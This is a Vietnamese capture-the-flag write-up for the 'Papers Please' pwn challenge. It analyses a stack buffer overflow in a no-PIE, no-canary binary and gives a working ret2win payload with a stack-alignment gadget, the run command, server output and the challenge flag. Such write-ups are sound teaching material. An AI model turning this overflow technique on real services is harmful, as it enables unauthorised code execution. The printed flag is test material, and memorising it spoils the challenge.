# Papers Please — Pwn (Easy)

**Flag:** `H7CTF{b66621cc-c85c-4042-b908-0d3dd36a71e5}` · **Target:** `pwn.h7tex.com:42578`
**Files:** `checkpoint.zip` (1077085 B, sha256 `737ceea6...a209da0b`) chứa `checkpoint` (ELF x86-64, 16344 B, sha256 `b04ebc61...`), `libc.so.6`, `ld-linux-x86-64.so.2`, `README.txt`.
Môi trường đích: Ubuntu 24.04, glibc 2.39-0ubuntu8.9.

## Đề bài

Trạm kiểm soát biên giới hỏi tên, echo tên vào log, trả "Access denied ... Turn back." rồi cắt kết nối. Sau quầy có sẵn con dấu, tức hàm cấp quyền. Lính gác không với lấy nó hộ ai. Mục tiêu: bắt dịch vụ in flag.

## Phân tích ban đầu

`triage.cjs` cho:

| Thuộc tính | Giá trị | Hệ quả |
| --- | --- | --- |
| `ET_EXEC`, no PIE | base cố định | không cần leak, địa chỉ hàm là hằng số tuyệt đối |
| Stack canary | không có (`__stack_chk_fail` không nằm trong imports) | đè return address tự do |
| NX | bật | không đặt shellcode trên stack, chỉ được tái sử dụng code có sẵn |
| Imports | `read fopen fgets printf puts setvbuf fflush fclose` | `read` không chặn theo độ dài buffer |

Ba hàm liên quan:

```
main        @ 0x401302   setvbuf(stdout, NULL, _IONBF, 0); call checkpoint
checkpoint  @ 0x4012a4   sub rsp,0x40 -> buffer 64 byte ở [rbp-0x40]
grant_access@ 0x401216   fopen("/flag","r"); fgets(buf,0x50); printf("ACCESS GRANTED: %s")
```

`main` không gọi `grant_access`. Hàm đó là con dấu trong đề: nó tự mở `/flag` rồi in nội dung ra.

Chỗ hỏng nằm ở `checkpoint`:

```
4012ce: lea   rax,[rbp-0x40]     ; buffer 64 byte
4012d2: mov   edx,0x100          ; đọc 256 byte
4012df: call  read@plt           ; read(0, buf, 256)
4012fa: call  printf@plt         ; printf("Access denied, %s. Turn back.", buf)
```

`read(0, buf, 0x100)` với `buf` chỉ 64 byte, không canary: stack overflow thuần túy.

## Các hướng đã loại

1. Format string qua tên. Chuỗi định dạng `"Access denied, %s. Turn back."` nằm trong `.rodata` và là đối số cố định của `printf`; tên người nhập chỉ đi vào `%s`. `%p`/`%n` gửi lên được in nguyên văn, không đọc và không ghi được stack.
2. Shellcode trên stack. NX bật.
3. Leak base trước khi đánh. `ET_EXEC`, no PIE: địa chỉ hàm là hằng số tuyệt đối, không có gì để leak.

## Chuỗi khai thác

**Bước 1 - offset tới return address.** Buffer ở `[rbp-0x40]` (64 byte), saved rbp ở `[rbp]` (8 byte), return address ở `[rbp+8]`. Offset = 64 + 8 = 72 byte. `read` cho phép gửi tối đa 256 byte, dư chỗ.

**Bước 2 - căn chỉnh stack.** ABI yêu cầu tại instruction đầu tiên của một hàm thì `rsp % 16 == 8`.

- Nhảy thẳng tới `grant_access` bằng `leave; ret`: `leave` đặt `rsp = rbp_checkpoint`, `pop rbp` đẩy lên 8, `ret` đẩy thêm 8, kết quả `rsp = rbp_main + 8`. `main` chỉ `push rbp` rồi call, nên `rbp_main % 16 == 0`. Vào `grant_access` với `rsp % 16 == 0`, lệch 8 byte so với chuẩn.
- `grant_access` gọi `fopen`/`fgets`/`printf` của glibc 2.39; các đường đó `movaps` trên stack và `SIGSEGV` khi stack lệch.

Chèn một gadget `ret` để dịch `rsp` thêm 8 byte. Chọn `_fini @ 0x401334` (`endbr64; sub rsp,8; add rsp,8; ret`): nó trượt stack đúng 8 byte, và mở đầu bằng `endbr64` nên vẫn hợp lệ nếu CPU bật CET/IBT.

**Bước 3 - payload.**

```python
OFFSET      = 72
GRANT_ACCESS = 0x401216
RET_SLIDE    = 0x401334

payload = b"DANH.B23DCAT040".ljust(OFFSET, b"A") + p64(RET_SLIDE) + p64(GRANT_ACCESS)
```

Tổng 88 byte, nhỏ hơn trần 256 byte của `read`. Không có ký tự cấm: `read` không dừng ở `\0`, và phần `printf` in tới `\0` chỉ là hiệu ứng phụ vô hại.

**Bước 4 - chạy.**

```
cd "H7CTF 2026 Quals/papers-please"
python exploit.py
```

Phản hồi nhận được:

```
=== Sparrow Freight border checkpoint ===
State your name for the log:
Access denied, DANH.B23DCAT040AAAA...4@. Turn back.
ACCESS GRANTED: H7CTF{b66621cc-c85c-4042-b908-0d3dd36a71e5}
```

**Bước 5 - Kiểm chứng.** Cờ được bắt bằng regex `H7CTF\{[^}\n]*\}` trên đúng byte đọc từ socket, rồi ghi thẳng vào `flag.txt`.

## Flag
```
H7CTF{b66621cc-c85c-4042-b908-0d3dd36a71e5}
```
